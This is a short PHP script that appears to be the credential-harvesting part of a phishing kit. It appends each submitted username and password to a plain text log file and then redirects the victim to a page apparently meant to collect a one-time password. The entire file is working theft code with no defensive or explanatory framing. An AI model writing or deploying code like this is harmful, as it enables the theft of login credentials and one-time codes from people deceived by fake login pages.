<?php

file_put_contents("log.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
